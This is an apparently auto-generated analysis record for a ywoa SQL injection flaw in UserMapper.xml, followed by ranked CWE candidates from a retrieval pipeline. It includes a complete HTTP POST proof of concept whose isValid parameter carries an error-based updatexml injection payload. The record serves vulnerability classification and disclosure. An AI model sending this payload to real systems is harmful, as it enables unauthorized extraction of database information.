## Vulnerability Description
A vulnerability classified as critical was found in ywoa up to 2024.07.03. This vulnerability affects the function listNameBySql of the file com/cloudweb/oa/mapper/xml/UserMapper.xml. The manipulation leads to **sql injection**. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 2024.07.04 is able to address this issue. It is recommended to upgrade the affected component.

### Vulnerability Description Key Phrases
- **weakness:** **sql injection**
- **product:** ywoa
- **version:** up to 2024.07.03
- **component:** com/cloudweb/oa/mapper/xml/UserMapper.xml

## CVE Reference Links Content Summary
## Analysis of CVE-2025-1224 Content (gitee.com_09d48d91_20250624_172450.html)

This content **RELATES** to a potential vulnerability.

**Root cause of vulnerability:**

The root cause is SQL injection due to parameter splicing within the `com/cloudweb/oa/mapper/xml/UserMapper.xml` file at line 98. Specifically, the `${sql}` variable is vulnerable to manipulation.

**Weaknesses/vulnerabilities present:**

*   SQL Injection

**Impact of exploitation:**

Successful exploitation could allow an attacker to execute arbitrary SQL queries, potentially leading to data breaches, modification, or deletion.

**Attack vectors:**

*   The vulnerability is triggered via the `/oa/user/list` endpoint.
*   Specifically, when `op=search&deptcode=root`, the `isValid` parameter can be manipulated to inject SQL code.

**Required attacker capabilities/position:**

*   An attacker needs to be able to send HTTP POST requests to the vulnerable endpoint.
*   No authentication is explicitly mentioned as a requirement in the provided text, but the presence of a "Cookie: XXX" in the PoC suggests that some form of session management is in place.

**Mitigation or fix:**

The content does not provide specific mitigation or fix details, only that the vulnerability exists in versions before 2024.07.04.  Proper input validation and parameterized queries should be implemented to prevent SQL injection.

**PoC (Proof of Concept):**

```
POST /oa/user/list HTTP/1.1
Host: localhost:8096
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Cookie: XXX
Connection: close
Content-Type: application/x-www-form-urlencoded
op=search&deptcode=root&isValid=1+order+by+u.orders+desc,regDate+desc)+tmp_count+where+1+=+1+and+updatexml(1,concat(0x7e,user(),0x7e),1)--+-+order+by+u.orders+desc,regDate+desc)+tmp_count
```

**Additional Details:**

The content provides a detailed analysis of the code path leading to the vulnerability, including specific file names and line numbers. This level of detail is more extensive than a typical CVE description. The issue was reported on 2025-01-16.

## Retriever Results

### Top Combined Results

| Rank | CWE ID | Name | Abstraction | Usage  | Retrievers | Individual Scores |
|------|--------|------|-------------|-------|------------|-------------------|
| 1 | 89 | Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') | Base | Allowed | alternate_terms | 1.000 |
| 2 | 79 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') | Base | Allowed | sparse | 0.469 |
| 3 | 99 | Improper Control of Resource Identifiers ('Resource Injection') | Class | Allowed-with-Review | sparse | 0.408 |
| 4 | 1336 | Improper Neutralization of Special Elements Used in a Template Engine | Base | Allowed | sparse | 0.406 |
| 5 | 705 | Incorrect Control Flow Scoping | Class | Allowed-with-Review | sparse | 0.395 |
| 6 | 74 | Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') | Class | Discouraged | sparse | 0.391 |
| 7 | 80 | Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS) | Variant | Allowed | sparse | 0.386 |
| 8 | 78 | Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') | Base | Allowed | sparse | 0.386 |
| 9 | 790 | Improper Filtering of Special Elements | Class | Allowed-with-Review | dense | 0.569 |
| 10 | 184 | Incomplete List of Disallowed Inputs | Base | Allowed | graph | 0.002 |



# Complete CWE Specifications

CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

CWE-99: Improper Control of Resource Identifiers ('Resource Injection')

CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

CWE-705: Incorrect Control Flow Scoping

CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')

CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)

CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

CWE-790: Improper Filtering of Special Elements

CWE-184: Incomplete List of Disallowed Inputs